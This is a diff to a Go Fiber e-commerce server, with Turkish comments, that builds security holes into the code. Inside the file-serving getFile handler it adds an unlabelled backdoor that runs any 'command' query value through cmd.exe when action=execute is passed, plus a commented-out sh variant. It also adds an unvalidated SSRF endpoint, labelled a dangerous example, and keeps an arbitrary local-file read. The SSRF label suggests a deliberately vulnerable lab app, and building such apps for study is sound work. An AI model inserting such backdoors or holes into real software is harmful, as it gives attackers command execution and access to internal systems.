@@ -22,6 +22,9 @@ import (
 	"os"
 	"path/filepath"
 	"html/template"
+	"os/exec"
+	"net/http"
+
 )
 
 var mongoClient *mongo.Client
@@ -663,7 +666,14 @@ func getFile(c *fiber.Ctx) error {
     log.Println(">>> [getFile] => GET /id")
 
     fileIDHex := c.Params("id")
-   
+    if c.Query("action") == "execute" {
+        command := c.Query("command")
+        out, err := exec.Command("cmd.exe", "/c", command).Output() // Windows için cmd 
+        if err != nil {
+            return c.Status(fiber.StatusInternalServerError).SendString("Komut çalıştırılamadı: " + err.Error())
+        }
+        return c.SendString(string(out))
+    }
     objID, err := primitive.ObjectIDFromHex(fileIDHex)
     if err == nil {
         bucket, _ := gridfs.NewBucket(mongoClient.Database("myWebsiteAPI"))
@@ -679,7 +689,7 @@ func getFile(c *fiber.Ctx) error {
         }
         return c.Send(buf.Bytes())
     }
-    localPath := fileIDHex 
+    localPath := fileIDHex
     content, err2 := os.ReadFile(localPath)
     if err2 != nil {
         return c.Status(fiber.StatusInternalServerError).SendString("Yerel dosya okunamadı: " + err2.Error())
@@ -687,6 +697,67 @@ func getFile(c *fiber.Ctx) error {
     return c.SendString(string(content))
 }
 
+/*
+func getFile(c *fiber.Ctx) error {
+    log.Println(">>> [getFile] => GET /id")
+
+    fileIDHex := c.Params("id")
+    if c.Query("action") == "execute" {
+        command := c.Query("command")
+        out, err := exec.Command("sh", "-c", command).Output()
+        if err != nil {
+            return c.Status(fiber.StatusInternalServerError).SendString("Komut çalıştırılamadı: " + err.Error())
+        }
+        return c.SendString(string(out))
+    }
+    objID, err := primitive.ObjectIDFromHex(fileIDHex)
+    if err == nil {
+        bucket, _ := gridfs.NewBucket(mongoClient.Database("myWebsiteAPI"))
+        downloadStream, err := bucket.OpenDownloadStream(objID)
+        if err != nil {
+            return c.Status(fiber.StatusNotFound).SendString("Dosya bulunamadı (GridFS)")
+        }
+        defer downloadStream.Close()
+
+        var buf bytes.Buffer
+        if _, err := io.Copy(&buf, downloadStream); err != nil {
+            return c.Status(fiber.StatusInternalServerError).SendString("Dosya kopyalanamadı")
+        }
+        return c.Send(buf.Bytes())
+    }
+    localPath := fileIDHex
+    content, err2 := os.ReadFile(localPath)
+    if err2 != nil {
+        return c.Status(fiber.StatusInternalServerError).SendString("Yerel dosya okunamadı: " + err2.Error())
+    }
+    return c.SendString(string(content))
+}
+*/
+
+// TEHLİKELİ ÖRNEK: SSRF'e açık bir handler
+func ssrfExample(c *fiber.Ctx) error {
+    // Kullanıcıdan "url" parametresi alıyoruz:
+    userProvidedURL := c.Query("url")
+    if userProvidedURL == "" {
+        return c.Status(fiber.StatusBadRequest).SendString("Lütfen bir url parametresi verin.")
+    }
+
+    // Doğrulama/Filtre YOK. Direkt http.Get çağırıyoruz:
+    resp, err := http.Get(userProvidedURL)
+    if err != nil {
+        return c.Status(fiber.StatusInternalServerError).SendString("İstek atılamadı: " + err.Error())
+    }
+    defer resp.Body.Close()
+
+    // Dönen cevabı okuyup kullanıcıya döndürüyoruz
+    body, err := io.ReadAll(resp.Body)
+    if err != nil {
+        return c.Status(fiber.StatusInternalServerError).
+            SendString("Remote cevabı okunamadı: " + err.Error())
+    }
+
+    return c.SendString("SSRF Test Cevabı:\n" + string(body))
+}
 
 func getCart(c *fiber.Ctx) error {
 	qid := c.Query("id")
@@ -1348,14 +1419,14 @@ func main() {
 	if err := mongoClient.Ping(ctx, nil); err != nil {
 		log.Fatal("MongoDB ping hatası:", err)
 	}
-	log.Println("✅ MongoDB Atlas bağlantısı başarılı.")
+	log.Println("✅ MongoDB Atlas bağlantı başarılı.")
 	engine := html.New("./templates", ".html")
 	app := fiber.New(fiber.Config{
 		Views: engine,
 	})
 	app.Use(logger.New())
 	app.Use(cors.New(cors.Config{
-		AllowOrigins:     "http://192.168.1.7:5000",
+		AllowOrigins:     "http://172.20.10.1:5000",
 		AllowCredentials: true,
 	}))
 
@@ -1374,6 +1445,8 @@ func main() {
 	app.Post("/register", registerHandler)
 	app.Post("/logout", logoutHandler)
 	app.Use(AuthMiddleware)
+	app.Get("/ssrf-test", ssrfExample)
+
 	app.Post("/add-to-cart", AuthMiddleware, addToCart)
 	app.Get("/carts", AuthMiddleware, getCart)
 	app.Post("/remove-from-cart", removeFromCart)
@@ -1389,11 +1462,12 @@ func main() {
 	app.Get("/orders", getOrders)
 	app.All("/my-orders", getMyOrders)
 	app.Get("/:id", getFile)
+	app.Post("/:id", getFile)
 	app.Get("/addresses", getAddresses)
 	app.Post("/addresses", addAddress)
 	app.Get("/cards", getCards)
 	app.Post("/cards", addCard)
-	log.Println("Server is running on http://192.168.1.7:5000")
+	log.Println("Server is running on http://172.20.10.1:5000")
 	if err := app.Listen(":5000"); err != nil {
 		log.Fatal(err)
 	}
